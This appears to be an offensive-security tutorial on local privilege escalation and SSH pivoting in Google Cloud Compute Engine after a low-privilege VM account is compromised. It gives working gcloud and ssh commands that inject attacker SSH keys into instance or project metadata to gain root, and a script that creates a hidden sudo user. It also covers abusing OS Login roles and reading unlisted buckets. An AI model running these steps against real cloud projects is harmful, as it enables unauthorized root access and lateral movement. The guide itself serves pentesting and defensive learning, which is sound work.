# GCP - Local Privilege Escalation / SSH Pivoting

in this scenario we are going to suppose that you **have compromised a non privilege account** inside a VM in a Compute Engine project.

Amazingly, GPC permissions of the compute engine you have compromised may help you to **escalate privileges locally inside a machine**. Even if that won't always be very helpful in a cloud environment, it's good to know it's possible.

## Read the scripts <a href="follow-the-scripts" id="follow-the-scripts"></a>

**Compute Instances** are probably there to **execute some scripts** to perform actions with their service accounts.

As IAM is go granular, an account may have **read/write** privileges over a resource but **no list privileges**.

A great hypothetical example of this is a Compute Instance that has permission to read/write backups to a storage bucket called `instance82736-long-term-xyz-archive-0332893`.

Running `gsutil ls` from the command line returns nothing, as the service account is lacking the `storage.buckets.list` IAM permission. However, if you ran `gsutil ls gs://instance82736-long-term-xyz-archive-0332893` you may find a complete filesystem backup, giving you clear-text access to data that your local Linux account lacks.

You may be able to find this bucket name inside a script (in bash, Python, Ruby...).

## Modifying the metadata <a href="modifying-the-metadata" id="modifying-the-metadata"></a>

If you can **modify the instance's metadata**, there are numerous ways to escalate privileges locally. There are a few scenarios that can lead to a service account with this permission:

_**Default service account**_\
If the service account access **scope** is set to **full access** or at least is explicitly allowing **access to the compute API**, then this configuration is **vulnerable** to escalation. The **default** **scope** is **not** **vulnerable**.

_**Custom service account**_\
When using a custom service account, **one** of the following IAM permissions **is** **necessary** to escalate privileges:

* `compute.instances.setMetadata` (to affect a single instance)
* `compute.projects.setCommonInstanceMetadata` (to affect all instances in the project)

Although Google [recommends](https://cloud.google.com/compute/docs/access/service-accounts#associating_a_service_account_to_an_instance) not using access scopes for custom service accounts, it is still possible to do so. You'll need one of the following **access scopes**:

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platfo`rm

## **Add SSH keys **

### **Add SSH keys to custom metadata**

**Linux** **systems** on GCP will typically be running [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) scripts. One of these is the [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), which **periodically** **queries** the instance metadata endpoint for **changes to the authorized SSH public keys**.

**If a new public** key is encountered, it will be processed and **added to the local machine**. Depending on the format of the key, it will either be added to the `~/.ssh/authorized_keys` file of an **existing user or will create a new user with `sudo` rights**.

So, if you can **modify custom instance metadata** with your service account, you can **escalate** to root on the local system by **gaining SSH rights** to a privileged account. If you can modify **custom project metadata**, you can **escalate** to root on **any system in the current GCP project** that is running the accounts daemon.

### **Add SSH key to existing privileged user**

Let's start by adding our own key to an existing account, as that will probably make the least noise. 

**Check the instance for existing SSH keys**. Pick one of these users as they are likely to have sudo rights.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```

Look for a section like the following:

```
 ...
 metadata:
   fingerprint: QCZfVTIlKgs=
   items:
   ...
   - key: ssh-keys
     value: |-
       alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
       bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
 ...
```

Notice the **slightly odd format** of the public keys - the **username** is listed at the **beginning** (followed by a colon) and then again at the **end**. We'll need to match this format. Unlike normal SSH key operation, the username absolutely matters!

**Save the lines with usernames and keys in a new text** file called `meta.txt`.

Let's assume we are targeting the user `alice` from above. We'll **generate a new key** for ourselves like this:

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```

Add your new public key to the file `meta.txt` imitating the format:

```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```

Now, you can** re-write the SSH key metadata** for your instance with the following command:

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

You can now **access a shell in the context of `alice`** as follows:

```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

### **Create a new privileged user and add a SSH key**

No existing keys found when following the steps above? No one else interesting in `/etc/passwd` to target?

You can **follow the same process** as above, but just **make up a new username**. This user will be created automatically and given rights to `sudo`. Scripted, the process would look like this:

```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```

### **Grant sudo to existing session**

This one is so easy, quick, and dirty that it feels wrong…

```
gcloud compute ssh [INSTANCE NAME]
```

This will **generate a new SSH key, add it to your existing user, and add your existing username to the `google-sudoers` group**, and start a new SSH session. While it is quick and easy, it may end up making more changes to the target system than the previous methods.

## **Using OS Login**

[OS Login](https://cloud.google.com/compute/docs/oslogin/) is an alternative to managing SSH keys. It links a** Google user or service account to a Linux identity**, relying on IAM permissions to grant or deny access to Compute Instances.

OS Login is [enabled](https://cloud.google.com/compute/docs/instances/managing-instance-access#enable_oslogin) at the project or instance level using the metadata key of `enable-oslogin = TRUE`.

OS Login with two-factor authentication is [enabled](https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication) in the same manner with the metadata key of `enable-oslogin-2fa = TRUE`.

The following two **IAM permissions control SSH access to instances with OS Login enabled**. They can be applied at the project or instance level:

* **roles/compute.osLogin** (no sudo)
* **roles/compute.osAdminLogin** (has sudo)

Unlike managing only with SSH keys, these permissions allow the administrator to control whether or not `sudo` is granted.

If your service account has these permissions.** You can simply run the `gcloud compute ssh [INSTANCE]`** command to [connect manually as the service account](https://cloud.google.com/compute/docs/instances/connecting-advanced#sa_ssh_manual). **Two-factor **is **only** enforced when using **user accounts**, so that should not slow you down even if it is assigned as shown above.

Similar to using SSH keys from metadata, you can use this strategy to **escalate privileges locally and/or to access other Compute Instances** on the network.

## SSH keys at project level <a href="sshing-around" id="sshing-around"></a>

Following the details mentioned in the previous section you can try to compromise more VMs.

We can expand upon those a bit by [**applying SSH keys at the project level**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide), granting you permission to **SSH into a privileged account** for any instance that has not explicitly chosen the "Block project-wide SSH keys" option.:

```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

If you're really bold, you can also just type `gcloud compute ssh [INSTANCE]` to use your current username on other boxes.
